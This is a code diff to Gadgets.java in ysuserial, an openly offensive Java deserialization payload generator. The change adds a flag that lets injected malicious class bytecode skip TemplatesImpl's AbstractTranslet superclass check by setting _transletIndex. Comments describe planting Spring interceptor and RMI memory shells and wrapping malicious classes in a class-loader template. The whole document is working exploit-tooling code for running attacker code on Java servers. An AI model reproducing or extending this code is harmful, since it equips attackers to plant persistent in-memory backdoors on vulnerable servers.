@@ -2,6 +2,7 @@ package org.su18.ysuserial.payloads.util;
 
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
+import static org.su18.ysuserial.GeneratePayload.IS_INHERIT_ABSTRACT_TRANSLET;
 import static org.su18.ysuserial.GeneratePayload.IS_SHORT;
 import static org.su18.ysuserial.payloads.templates.MemShellPayloads.*;
 
@@ -200,7 +201,12 @@ public class Gadgets {
 				ctClass.makeClassInitializer().insertBefore(cmd);
 
 			}
-			ctClass.setSuperclass(superClass);
+
+			// 如果全局配置继承，再设置父类
+			if (IS_INHERIT_ABSTRACT_TRANSLET) {
+				ctClass.setSuperclass(superClass);
+			}
+
 			classBytes = ctClass.toBytecode();
 		}
 
@@ -211,7 +217,11 @@ public class Gadgets {
 
 			// 如果是打入 Spring Controller 类型的内存马，则修改 SpringInterceptorTemplate 创建类字节码，并写入 SpringInterceptorMS 中
 			if (className.contains("SpringInterceptorMS")) {
-				ctClass.setSuperclass(superClass);
+
+				if (IS_INHERIT_ABSTRACT_TRANSLET) {
+					ctClass.setSuperclass(superClass);
+				}
+
 				String  target              = "org.su18.ysuserial.payloads.templates.memshell.spring.SpringInterceptorTemplate";
 				CtClass springTemplateClass = pool.get(target);
 				// 类名后加时间戳
@@ -229,7 +239,10 @@ public class Gadgets {
 
 			} else if (className.contains("RMIBindTemplate")) {
 				// 如果是 RMI 内存马，则修改其中的 registryPort、bindPort、serviceName，插入关键方法
-				ctClass.setSuperclass(superClass);
+
+				if (IS_INHERIT_ABSTRACT_TRANSLET) {
+					ctClass.setSuperclass(superClass);
+				}
 
 				String[] parts = cName.split("-");
 
@@ -271,10 +284,17 @@ public class Gadgets {
 					cName = ctClass.getName();
 					// 内存马指定类型进行写入恶意逻辑
 				} else if (!Objects.equals(cName, "")) {
-					ctClass.setSuperclass(superClass);
+
+					if (IS_INHERIT_ABSTRACT_TRANSLET) {
+						ctClass.setSuperclass(superClass);
+					}
+
 					insertKeyMethod(ctClass, cName);
 				} else {
-					ctClass.setSuperclass(superClass);
+
+					if (IS_INHERIT_ABSTRACT_TRANSLET) {
+						ctClass.setSuperclass(superClass);
+					}
 				}
 
 				// 写出和加载测试
@@ -286,18 +306,24 @@ public class Gadgets {
 		}
 		// 如果 bytes 不为空，则使用 ClassLoaderTemplate 加载任意恶意类字节码
 		if (bytes != null) {
-			ctClass = pool.get("org.su18.ysuserial.payloads.templates.ClassLoaderTemplate");
-			ctClass.setName(ctClass.getName() + System.nanoTime());
-			ByteArrayOutputStream outBuf           = new ByteArrayOutputStream();
-			GZIPOutputStream      gzipOutputStream = new GZIPOutputStream(outBuf);
-			gzipOutputStream.write(bytes);
-			gzipOutputStream.close();
-			String content   = "b64=\"" + Base64.encodeBase64String(outBuf.toByteArray()) + "\";";
-			String className = "className=\"" + cName + "\";";
-			ctClass.makeClassInitializer().insertBefore(content);
-			ctClass.makeClassInitializer().insertBefore(className);
-			ctClass.setSuperclass(superClass);
-			classBytes = ctClass.toBytecode();
+			// 如果恶意类继承 AbstractTranslet，则需要使用 ClassLoaderTemplate 封装，因为原有的恶意类可能自己有父类
+			if (IS_INHERIT_ABSTRACT_TRANSLET) {
+				ctClass = pool.get("org.su18.ysuserial.payloads.templates.ClassLoaderTemplate");
+				ctClass.setName(ctClass.getName() + System.nanoTime());
+				ByteArrayOutputStream outBuf           = new ByteArrayOutputStream();
+				GZIPOutputStream      gzipOutputStream = new GZIPOutputStream(outBuf);
+				gzipOutputStream.write(bytes);
+				gzipOutputStream.close();
+				String content   = "b64=\"" + Base64.encodeBase64String(outBuf.toByteArray()) + "\";";
+				String className = "className=\"" + cName + "\";";
+				ctClass.makeClassInitializer().insertBefore(content);
+				ctClass.makeClassInitializer().insertBefore(className);
+				ctClass.setSuperclass(superClass);
+				classBytes = ctClass.toBytecode();
+			} else {
+				// 如果恶意类不继承 AbstractTranslet，则无需使用恶意类封装，使用 _transletIndex 及 classCount 逻辑绕过父类校验
+				classBytes = bytes;
+			}
 		}
 
 		// 写出 class 试试
@@ -309,8 +335,15 @@ public class Gadgets {
 		// 写入前将 classBytes 中的类标识设为 JDK 1.6 的版本号
 		classBytes[7] = 49;
 
-		// inject class bytes into instance
-		Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(CheckCPUTime.class)});
+		// 恶意类是否继承 AbstractTranslet
+		if (IS_INHERIT_ABSTRACT_TRANSLET) {
+			// inject class bytes into instance
+			Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
+		} else {
+			Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(CheckCPUTime.class)});
+			// 当 _transletIndex >= 0 且 classCount 也就是生成类的数量大于 1 时，不需要继承 AbstractTranslet
+			Reflections.setFieldValue(templates, "_transletIndex", 0);
+		}
 
 		// required to make TemplatesImpl happy
 		Reflections.setFieldValue(templates, "_name", RandomStringUtils.randomAlphabetic(8).toUpperCase());
